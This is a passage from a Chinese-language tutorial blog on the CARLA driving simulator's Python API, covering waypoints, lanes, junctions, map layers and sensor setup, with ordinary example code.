class="line"><span class="built_in">print</span>(world)</span><br><span class="line"><span class="built_in">map</span> = world.get_map()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">map</span>)</span><br><span class="line">waypoints = <span class="built_in">map</span>.generate_waypoints(<span class="number">100000</span>)</span><br><span class="line"><span class="built_in">print</span>(waypoints)</span><br><span class="line">waypoint = waypoints[<span class="number">4</span>]</span><br><span class="line"><span class="built_in">print</span>(waypoint)</span><br><span class="line">landmarks = waypoint.get_landmarks(<span class="number">20000.0</span>, <span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(landmarks)</span><br></pre></td></tr></table></figure><h4 id="2-6-3航点"><a href="#2-6-3航点" class="headerlink" title="2.6.3航点"></a>2.6.3航点</h4><p>carla.Waypoint 是 CARLA 世界中的 3D 定向点，对应于 OpenDRIVE 车道。 与航点相关的一切都发生在客户端； 只需与服务器通信一次即可获取包含航点信息的地图对象。</p><p>每个航路点都包含一个 carla.Transform，它说明了它在地图上的位置以及包含它的车道的方向。 变量 road_id、section_id、lane_id 和 s 对应于 OpenDRIVE 道路。 路点的 id 由这四个值的哈希组合构成。</p><p>航路点保存有关包含它的车道的信息。 此信息包括车道的左右车道标记、确定车道是否在交叉路口内的布尔值、车道类型、宽度和车道变更权限。</p><p><strong>注意：同一条道路上距离小于2厘米的路标共用相同的id。</strong></p><p>航点还包含他所在的车道信息。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Access lane information from a waypoint</span></span><br><span class="line">inside_junction = waypoint.is_junction</span><br><span class="line"><span class="built_in">print</span>(inside_junction)</span><br><span class="line">width = waypoint.lane_width</span><br><span class="line"><span class="built_in">print</span>(width)</span><br><span class="line">right_lm_color = waypoint.right_lane_marking.color</span><br><span class="line"><span class="built_in">print</span>(right_lm_color)</span><br><span class="line"><span class="built_in">print</span>(waypoint.transform)</span><br></pre></td></tr></table></figure><h4 id="2-6-4-车道"><a href="#2-6-4-车道" class="headerlink" title="2.6.4 车道"></a>2.6.4 车道</h4><p>OpenDRIVE 标准 1.4 定义的车道类型作为一系列枚举值转换为 carla.LaneType 中的 API。</p><p>车道周围的车道标记可通过 carla.LaneMarking 访问。 车道标记由一系列变量定义：</p><ul><li>颜色：carla.LaneMarkingColor 是定义标记颜色的枚举值。</li><li>变道：carla.LaneChange 说明车道是否允许左转、右转、两者都允许或不允许。</li><li>类型：carla.LaneMarkingType 是根据 OpenDRIVE 标准定义标记类型的枚举值。</li><li>宽度：定义标记的厚度。</li></ul><p>下面的示例显示了获取有关特定航路点的车道类型、车道标记和车道变更权限的信息：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Get the lane type where the waypoint is</span></span><br><span class="line">lane_type = waypoint.lane_type</span><br><span class="line"><span class="built_in">print</span>(lane_type)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get the type of lane marking on the left</span></span><br><span class="line">left_lanemarking_type = waypoint.left_lane_marking.<span class="built_in">type</span></span><br><span class="line"><span class="built_in">print</span>(left_lanemarking_type)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get available lane changes for this waypoint</span></span><br><span class="line">lane_change = waypoint.lane_change</span><br><span class="line"><span class="built_in">print</span>(lane_change)</span><br></pre></td></tr></table></figure><h4 id="2-6-5-路口"><a href="#2-6-5-路口" class="headerlink" title="2.6.5 路口"></a>2.6.5 路口</h4><p>carla.Junction 表示 OpenDRIVE 连接点。 此类包含一个带有边界框的交叉路口，以识别其中的车道或车辆。</p><p>carla.Junction 类包含 get_waypoints 方法，该方法为路口内的每条车道返回一对航路点。 每对都位于交汇点边界的起点和终点。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取路口</span></span><br><span class="line">junction = waypoint.get_junction()</span><br><span class="line"><span class="built_in">print</span>(junction)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取路口范围的航路点</span></span><br><span class="line">waypoints_junc = junction.get_waypoints(carla.LaneType.<span class="type">Any</span>)</span><br><span class="line"><span class="built_in">print</span>(waypoints_junc)</span><br></pre></td></tr></table></figure><h4 id="2-6-6-环境对象"><a href="#2-6-6-环境对象" class="headerlink" title="2.6.6 环境对象"></a>2.6.6 环境对象</h4><p>CARLA 地图上的每个对象都有一组相关变量，可在此处找到。 详见 carla.EnvironmentObject。这些变量中包含一个唯一 ID，可用于切换该对象在地图上的可见性。 您可以使用 Python API 根据语义标签获取每个环境对象的 ID：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Get the building in the world</span></span><br><span class="line">env_objs = world.get_environment_objects(carla.CityObjectLabel.Buildings)</span><br><span class="line"><span class="built_in">print</span>(env_objs)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Access individual building IDs and save in a set</span></span><br><span class="line">building_01 = env_objs[<span class="number">0</span>]</span><br><span class="line">building_02 = env_objs[<span class="number">1</span>]</span><br><span class="line">objects_to_toggle = &#123;building_01.<span class="built_in">id</span>, building_02.<span class="built_in">id</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(objects_to_toggle)</span><br><span class="line"></span><br><span class="line">spectator = world.get_spectator()</span><br><span class="line">spectator.set_transform(carla.Transform(building_01.transform.location + carla.Location(<span class="number">0</span>,<span class="number">0</span>,<span class="number">30</span>),</span><br><span class="line">    carla.Rotation(pitch=-<span class="number">90</span>)))</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Toggle buildings off</span></span><br><span class="line">world.enable_environment_objects(objects_to_toggle, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line"><span class="comment"># Toggle buildings on</span></span><br><span class="line">world.enable_environment_objects(objects_to_toggle, <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="2-7-CARLA中的导航"><a href="#2-7-CARLA中的导航" class="headerlink" title="2.7 CARLA中的导航"></a>2.7 CARLA中的导航</h3><p>CARLA 中的导航是通过 Waypoint API 管理的，它是 carla.Waypoint 和 carla.Map 方法的组合。</p><p>客户端必须首先与服务器通信以检索包含航点信息的地图对象。 这只需要一次，所有后续查询都在客户端执行。</p><h4 id="2-7-1-通过航点导航"><a href="#2-7-1-通过航点导航" class="headerlink" title="2.7.1 通过航点导航"></a>2.7.1 通过航点导航</h4><p>Waypoint API 公开了一些方法，这些方法允许路点相互连接并沿着道路构建路径供车辆导航：</p><ul><li>next(d) 在车道方向上创建近似距离 d 内的航路点列表。 该列表包含每个可能偏差的一个航路点。</li><li>previous(d) 创建一个航路点列表，航路点在车道相反方向的近似距离 d 内。 该列表包含每个可能偏差的一个航路点。</li><li>next_until_lane_end(d) 和 previous_until_lane_start(d) 返回相距 d 的航路点列表。 这些列表分别从当前航路点到其车道的终点和起点。</li><li>get_right_lane() 和 get_left_lane() 返回相邻车道中的等效航路点（如果存在）。 可以通过在其右&#x2F;左车道上找到下一个航路点并移动到该航路点来进行变道操作。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Find next waypoint 2 meters ahead.</span></span><br><span class="line">waypoint = waypoint.<span class="built_in">next</span>(<span class="number">2.0</span>)</span><br></pre></td></tr></table></figure><p>以下代码，生成车辆，获取航路点。关闭车辆的物理模拟，在 loop 中获取下一个航路点，将车辆 transform 设置到航路点位置，同时将 spectator 设置到当前车辆位置上方俯视观察：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_spectator_transform</span>(<span class="params">in_transform</span>):</span><br><span class="line">    spectator = world.get_spectator()</span><br><span class="line">    spectator.set_transform(carla.Transform(in_transform.location + carla.Location(<span class="number">0</span>,<span class="number">0</span>,<span class="number">30</span>),</span><br><span class="line">        carla.Rotation(pitch=-<span class="number">90</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Spawn vehicle</span></span><br><span class="line">vehicle_bp = world.get_blueprint_library().find(<span class="string">&#x27;vehicle.audi.tt&#x27;</span>)</span><br><span class="line">spawn_point = random.choice(<span class="built_in">map</span>.get_spawn_points())</span><br><span class="line">vehicle = world.spawn_actor(vehicle_bp, spawn_point)</span><br><span class="line">set_spectator_transform(vehicle.get_transform())</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get waypoint</span></span><br><span class="line">waypoint = <span class="built_in">map</span>.get_waypoint(vehicle.get_location())</span><br><span class="line"><span class="built_in">print</span>(waypoint)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Disable physics, in this example the vehicle is teleported</span></span><br><span class="line">vehicle.set_simulate_physics(<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># Find next waypoint 2 meters ahead</span></span><br><span class="line">    waypoint = random.choice(waypoint.<span class="built_in">next</span>(<span class="number">0.2</span>))</span><br><span class="line">    <span class="comment"># waypoint = waypoint.next(2.0)</span></span><br><span class="line">    <span class="built_in">print</span>(waypoint)</span><br><span class="line">    <span class="comment"># Teleport the vehicle</span></span><br><span class="line">    vehicle.set_transform(waypoint.transform)</span><br><span class="line">    set_spectator_transform(waypoint.transform)</span><br></pre></td></tr></table></figure><p>有一种纯数学方法的航点导航法，似乎已经无法使用，具体原因我水平太低经过无数测试也没找出来。</p><h4 id="2-7-2-生成地图导航"><a href="#2-7-2-生成地图导航" class="headerlink" title="2.7.2 生成地图导航"></a>2.7.2 生成地图导航</h4><p>客户端需要向服务器发出请求以获取 .xodr 映射文件并将其解析为 carla.Map 对象。 这只需要执行一次。</p><p>这里补充一点OpenDRIVE的知识：</p><p>OpenDRIVE格式是以可扩展标记语言(XML)为基础，文件后缀为xodr格式的描述道路及道路网的通用标准。存储在OpenDRIVE文件中的数据描述了道路的几何形状以及沿线的特征并且定义了可以影响交通逻辑的交通标志以及道路基础设施，例如车道和信号灯。</p><p>路网是OpenDRIVE文件中描述的道路信息，其既是基于经验建造的，也可以是依据真实道路数据生成的。OpenDRIVE的主要目的是提供一种可用于仿真模拟的道路网络描述，并且可以使得这些道路以及道路网的描述可以在仿真平台或仿真软件中被自定义或改变。</p><p>OpenDRIVE根据XML的格式以节点和元素描述道路中各类信息。这样的通用格式有助于虚拟仿真测试的高度专业化，并且可以保持不同国家之间数据交换所需的相互操作性。</p><p>获取地图对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">map</span> = world.get_map()</span><br></pre></td></tr></table></figure><p>地图对象包含用于创建车辆的推荐生成点。 您可以使用以下方法获取这些生成点的列表，每个生成点都包含一个 carla.Transform。 请记住，生成点可能已经被占用，导致由于碰撞而无法创建车辆。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spawn_points = world.get_map().get_spawn_points()</span><br></pre></td></tr></table></figure><p>您可以通过获取最接近特定位置或地图 OpenDRIVE 定义中的特定 road_id、lane_id 和 s 值的航点来开始使用航点：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Nearest waypoint in the center of a Driving or Sidewalk lane.</span></span><br><span class="line">waypoint01 = <span class="built_in">map</span>.get_waypoint(vehicle.get_location(),project_to_road=<span class="literal">True</span>, lane_type=(carla.LaneType.Driving | carla.LaneType.Sidewalk))</span><br><span class="line"></span><br><span class="line"><span class="comment">#Nearest waypoint but specifying OpenDRIVE parameters. </span></span><br><span class="line">waypoint02 = <span class="built_in">map</span>.get_waypoint_xodr(road_id,lane_id,s)</span><br></pre></td></tr></table></figure><p>下面的示例显示了如何生成航点集合以可视化城市车道。 这将在地图上为每条道路和车道创建航点。 它们都将相距约 2 米：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">waypoint_list = <span class="built_in">map</span>.generate_waypoints(<span class="number">2.0</span>)</span><br></pre></td></tr></table></figure><p>要生成道路拓扑的最小图，请使用以下示例。 这将返回航点对（元组）的列表。 每对中的第一个元素与第二个元素连接，并且都定义了地图中每个车道的起点和终点。 有关此方法的更多信息，请参阅 PythonAPI。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">waypoint_tuple_list = <span class="built_in">map</span>.get_topology()</span><br></pre></td></tr></table></figure><p>下面的示例以 carla.GeoLocation 的形式将 carla.Transform 转换为地理纬度和经度坐标：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">my_geolocation = <span class="built_in">map</span>.transform_to_geolocation(vehicle.transform)</span><br></pre></td></tr></table></figure><p>使用以下示例将 OpenDRIVE 格式的道路信息保存到磁盘：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info_map = <span class="built_in">map</span>.to_opendrive()</span><br></pre></td></tr></table></figure><h3 id="2-8-CARLA中的地图"><a href="#2-8-CARLA中的地图" class="headerlink" title="2.8 CARLA中的地图"></a>2.8 CARLA中的地图</h3><p>CARLA 有8个城镇，每个城镇有2种地图，即非分层地图和分层地图（后缀_Opt）。图层包含这些分组：</p><ul><li>NONE 无</li><li>Buildings 建筑</li><li>Decals 贴花</li><li>Foliage 植被</li><li>Ground 地面</li><li>ParkedVehicles 停靠的车辆</li><li>Particles 粒子</li><li>Props 杂物</li><li>StreetLights 路灯</li><li>Walls 墙体</li><li>All 所有</li></ul><h4 id="2-8-1-非分层地图"><a href="#2-8-1-非分层地图" class="headerlink" title="2.8.1 非分层地图"></a>2.8.1 非分层地图</h4><p>非分层地图如下表所示（单击城镇名称可查看布局的俯视图）。 所有图层始终存在，并且无法在这些地图中打开或关闭。 在 CARLA 0.9.11 之前，这些是唯一可用的地图类型。</p><ul><li>Town01：基本城镇，T型路口</li><li>Town02：类似Town01，更小</li><li>Town03：复杂城镇，5车道路口，环路，坡道，隧道</li><li>Town04：高速路和小镇的循环道路</li><li>Town05：带有交叉路口和桥的格子小镇。每个方向有多条车道，适合验证变道</li><li>Town06：长高速路，出入匝道</li><li>Town07：乡村环境，道路狭窄，少信号灯</li><li>Town10：高清城市环境</li></ul><h4 id="2-8-2-分层地图"><a href="#2-8-2-分层地图" class="headerlink" title="2.8.2 分层地图"></a>2.8.2 分层地图</h4><p>分层地图的布局与非分层地图的布局相同，但可以关闭和打开地图的图层。 有一个不能关闭的最小布局，由道路、人行道、交通信号灯和交通标志组成。 分层地图可以通过后缀 _Opt 来标识，例如 Town01_Opt。 使用这些地图，可以通过 Python API 加载和卸载图层：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Load layerred map for Town01 with minimum layout plus buildings and parked vehicles</span></span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">world = client.load_world(<span class="string">&#x27;Town01_Opt&#x27;</span>, carla.MapLayer.Buildings | carla.MapLayer.ParkedVehicles)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Toggle all buildings off</span></span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">world.unload_map_layer(carla.MapLayer.Buildings)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Toggle all buildings on</span></span><br><span class="line">time.sleep(<span class="number">3</span>)</span><br><span class="line">world.load_map_layer(carla.MapLayer.Buildings)</span><br></pre></td></tr></table></figure><h4 id="2-8-3-自定义地图"><a href="#2-8-3-自定义地图" class="headerlink" title="2.8.3 自定义地图"></a>2.8.3 自定义地图</h4><p>CARLA 旨在为专业应用程序提供可扩展性和高度可定制性。 因此，除了 CARLA 中已经开箱即用的许多地图和资产外，还可以创建和导入新的地图、道路网络和资产，以在 CARLA 模拟中填充定制环境。官方文档中有详细的介绍。而大多数情况下暂时不需要用到，因此这里不多加赘述，可以到CARKA官网中查看详细教程。</p><h3 id="2-9-传感器与数据"><a href="#2-9-传感器与数据" class="headerlink" title="2.9  传感器与数据"></a>2.9  传感器与数据</h3><p>传感器是从周围环境中检索数据的actor，“参与者”。</p><p>carla.Sensor 类定义了一种特殊类型的actor，能够测量和流式传输数据。</p><ul><li>这是什么数据？ 根据传感器的类型，它变化很大。 所有类型的数据都继承自通用 carla.SensorData。</li><li>他们什么时候检索数据？ 在每个模拟步骤或注册某个事件时。 取决于传感器的类型。</li><li>他们如何检索数据？ 每个传感器都有一个listen() 方法来接收和管理数据。</li></ul><p>尽管存在差异，但所有传感器都以相似的方式使用。</p><h4 id="2-9-1-设置"><a href="#2-9-1-设置" class="headerlink" title="2.9.1 设置"></a>2.9.1 设置</h4><p>与其他所有参与者一样，找到蓝图并设置特定属性。 这在处理传感器时至关重要。 它们的属性将决定获得的结果。</p><p>以下示例设置仪表板高清摄像头。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Find the blueprint of the sensor.</span></span><br><span class="line">blueprint = world.get_blueprint_library().find(<span class="string">&#x27;sensor.camera.rgb&#x27;</span>)</span><br><span class="line"><span class="comment"># Modify the attributes of the blueprint to set image resolution and field of view.</span></span><br><span class="line">blueprint.set_attribute(<span class="string">&#x27;image_size_x&#x27;</span>, <span class="string">&#x27;1920&#x27;</span>)</span><br><span class="line">blueprint.set_attribute(<span class="string">&#x27;image_size_y&#x27;</span>, <span class="string">&#x27;1080&#x27;</span>)</span><br><span class="line">blueprint.set_attribute(<span class="string">&#x27;fov&#x27;</span>, <span class="string">&#x27;110&#x27;</span>)</span><br><span class="line"><span class="comment"># Set the time in seconds between sensor captures</span></span><br><span class="line">blueprint.set_attribute(<span class="string">&#x27;sensor_tick&#x27;</span>, <span class="string">&#x27;1.0&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="2-9-2-生成"><a href="#2-9-2-生成" class="headerlink" title="2.9.2 生成"></a>2.9.2 生成</h4><p>attach_to 和attachment_type 至关重要。 传感器应该连接到父参与者（通常是车辆）上，以跟随它并收集信息。 附件类型将确定其位置关于所述车辆的更新方式。</p><ul><li>刚性附加。 运动对其父位置非常严格。 这是从模拟中检索数据的正确附件。</li><li>弹性附加。 运动很平稳，加速和减速很少。 此附件仅推荐用于录制模拟视频。 移动是平滑的，并且在更新摄像机位置时避免了“跳跃”。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">transform = carla.Transform(carla.Location(x=<span class="number">0.8</span>, z=<span class="number">1.7</span>))</span><br><span class="line">sensor = world.spawn_actor(blueprint, transform, attach_to=my_vehicle)</span><br></pre></td></tr></table></figure><h4 id="2-9-3-监听"><a href="#2-9-3-监听" class="headerlink" title="2.9.3 监听"></a>2.9.3 监听</h4><p>每个传感器都有一个listen() 方法。 每次传感器检索数据时都会调用它。</p><p>参数回调是一个 lambda 函数。 它描述了传感器在检索数据时应该做什么。 这必须将检索的数据作为参数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># do_something() will be call each time a new image is generated by the camera</span></span><br><span class="line"><span class="comment"># sensor.listen(lambda data: do_something(date))</span></span><br><span class="line">sensor.listen(<span class="keyword">lambda</span> image: image.save_to_disk(<span class="string">&#x27;./output/%06d.png&#x27;</span> % image.frame))</span><br><span class="line"></span><br><span class="line"><span class="comment"># This collision sensor would print everytime a collision is detected</span></span><br><span class="line"><span class="comment"># def callback(event):</span></span><br><span class="line"><span class="comment">#     for actor_id in event:</span></span><br><span class="line"><span class="comment">#         vehicle = world_ref().get_actor(actor_id)</span></span><br><span class="line"><span class="comment">#         print(&#x27;Vehicle too close: %s&#x27; % vehicle.type_id)</span></span><br><span class="line"><span class="comment"># sensor02.listen(callback)</span></span><br></pre></td></tr></table></figure><h4 id="2-9-4-数据"><a href="#2-9-4-数据" class="headerlink" title="2.9.4 数据"></a>2.9.4 数据</h4><p>大多数传感器数据对象都具有将信息保存到磁盘的功能。 这将允许它在其他环境中使用。</p><p>传感器类型之间的传感器数据差异很大。 但是，它们总是带有一些基本信息的标记。</p><table><thead><tr><th>传感器数据属性</th><th>类型</th><th>描述</th></tr></thead><tbody><tr><td><code>frame</code></td><td>int</td><td>进行测量时的帧数。</td></tr><tr><td><code>timestamp</code></td><td>double</td><td>自剧集开始以来以模拟秒为单位的测量时间戳。</td></tr><tr><td><code>transform</code></td><td>carla.Transform</td><td>测量时传感器的世界参考。</td></tr></tbody></table><p><strong>注意：is_listening 是传感器属性，用于启用和关闭数据侦听。sensor_tick 是蓝图属性，用于设置接收数据之间的仿真时间</strong></p><p>将以上的代码完成一下，就实现了 <strong>设置 rgb 相机参数 -&gt; 生成相机演员附加在车辆上 -&gt; 设置相机回调方法，将图像保存在磁盘上 -&gt; 调用 world.tick() 接收服务器数据</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Find the blueprint of the sensor</span></span><br><span class="line">camera_bp = world.get_blueprint_library().find(<span class="string">&#x27;sensor.camera.rgb&#x27;</span>)</span><br><span class="line"><span class="comment"># Modify the attributes of the blueprint to set image resolution and field of view</span></span><br><span class="line">camera_bp.set_attribute(<span class="string">&#x27;image_size_x&#x27;</span>, <span class="string">&#x27;1920&#x27;</span>)</span><br><span class="line">camera_bp.set_attribute(<span class="string">&#x27;image_size_y&#x27;</span>, <span class="string">&#x27;1080&#x27;</span>)</span><br><span class="line">camera_bp.set_attribute(<span class="string">&#x27;fov&#x27;</span>, <span class="string">&#x27;110&#x27;</span>)</span><br><span class="line"><span class="comment"># Set the time in seconds between sensor captures</span></span><br><span class="line">camera_bp.set_attribute(<span class="string">&#x27;sensor_tick&#x27;</span>, <span class="string">&#x27;1.0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">camera_transform = carla.Transform(carla.Location(x=<span class="number">0.8</span>, z=<span class="number">1.7</span>))</span><br><span class="line">sensor = world.spawn_actor(camera_bp, camera_transform, attach_to=vehicle)</span><br><span class="line"></span><br><span class="line"><span class="comment"># do_something() will be call each time a new image is generated by the camera</span></span><br><span class="line"><span class="comment"># sensor.listen(lambda data: do_something(date))</span></span><br><span class="line">sensor.listen(<span class="keyword">lambda</span> image: image.save_to_disk(<span class="string">&#x27;./output/%06d.png&#x27;</span> % image.frame))</span><br><span class="line"></span><br><span class="line"><span class="comment"># This collision sensor would print everytime a collision is detected</span></span><br><span class="line"><span class="comment"># def callback(event):</span></span><br><span class="line"><span class="comment">#     for actor_id in event:</span></span><br><span class="line"><span class="comment">#         vehicle = world_ref().get_actor(actor_id)</span></span><br><span class="line"><span class="comment">#         print(&#x27;Vehicle too close: %s&#x27; % vehicle.type_id)</span></span><br><span class="line"><span class="comment"># sensor02.listen(callback)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Main loop</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># Tick the server</span></span><br><span class="line">    world.tick()</span><br><span class="line">    w_frame = world.get_snapshot().frame</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;World&#x27;s frame: %d&quot;</span> % w_frame)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="2-10-传感器的类型"><a href="#2-10-传感器的类型" class="headerlink" title="2.10 传感器的类型"></a>2.10 传感器的类型</h3><h4 id="2-10-1-摄像头"><a href="#2-10-1-摄像头" class="headerlink" title="2.10.1 摄像头"></a>2.10.1 摄像头</h4><p>从相机的角度拍摄世界。 对于返回 carla.Image 的相机，您可以使用帮助类 carla.ColorConverter 来修改图像类型以表示不同的信息。</p><ul><li>检索每个模拟步骤的数据。</li></ul><table><thead><tr><th>传感器</th><th>输出</th><th>概述</th></tr></thead><tbody><tr><td><a href="https://carla.readthedocs.io/en/latest/ref_sensors/#depth-camera">Depth</a></td><td><a href="https://carla.readthedocs.io/en/latest/python_api#carlaimage">carla.Image</a></td><td>在灰度图中渲染视场中元素的深度。</td></tr><tr><td><a href="https://carla.readthedocs.io/en/latest/ref_sensors/#rgb-camera">RGB</a></td><td><a href="https://carla.readthedocs.io/en/latest/python_api#carlaimage">carla.Image</a></td><td>提供对周围环境的清晰视野。 看起来像一张普通的现场照片。</td></tr><tr><td><a href="https://carla.readthedocs.io/en/latest/ref_sensors/#optical-flow-camera">Optical Flow</a></td><td><a href="https://carla.readthedocs.io/en/latest/python_api#carlaimage">carla.Image</a></td><td>渲染来自相机的每个像素的运动。</td></tr><tr><td><a href="https://carla.readthedocs.io/en/latest/ref_sensors/#semantic-segmentation-camera">Semantic segmentation</a></td><td><a href="https://carla.readthedocs.io/en/latest/python_api#carlaimage">carla.Image</a></td><td>根据标签以特定颜色渲染视野中的元素。</td></tr><tr><td><a href="https://carla.readthedocs.io/en/latest/ref_sensors/#instance-segmentation-camera">Instance segmentation</a></td><td><a href="https://carla.readthedocs.io/en/latest/python_api#carlaimage">carla.Image</a></td><td>根据标签和唯一的对象 ID 以特定颜色渲染视野中的元素。</td></tr><tr><td><a href="https://carla.readthedocs.io/en/latest/ref_sensors/#dvs-camera">DVS</a></td><td><a href="https://carla.readthedocs.io/en/latest/python_api#carladvseventarray">carla.DVSEventArray</a></td><td>作为事件流异步测量亮度强度的变化。</td></tr></tbody></table><h4 id="2-10-2-探测器"><a href="#2-10-2-探测器" class="headerlink" title="2.10.2 探测器"></a>2.10.2 探测器</h4><p>探测器，当传感器附加的物体触发特定事件时，检索数据：</p><table><thead><tr><th>传感器</th><th>输出</th><th>概述</th></tr></thead><tbody><tr><td><a href="https://carla.readthedocs.io/en/latest/ref_sensors/#collision-detector">Collision</a></td><td><a href="https://carla.readthedocs.io/en/latest/python_api#carlacollisionevent">carla.CollisionEvent</a></td><td>检索其父actor和其他actor之间的碰撞。</td></tr><tr><td><a href="https://carla.readthedocs.io/en/latest/ref_sensors/#lane-invasion-detector">Lane invasion</a></td><td><a href="https://carla.readthedocs.io/en/latest/python_api#carlalaneinvasionevent">carla.LaneInvasionEvent</a></td><td>在其父项越过车道标记时注册。</td></tr><tr><td><a href="https://carla.readthedocs.io/en/latest/ref_sensors/#obstacle-detector">Obstacle</a></td><td><a href="https://carla.readthedocs.io/en/latest/python_api#carlaobstacledetectionevent">carla.ObstacleDetectionEvent</a></td><td>检测到其父级之前可能存在的障碍。</td></tr></tbody></table><h4 id="2-10-3-其它"><a href="#2-10-3-其它" class="headerlink" 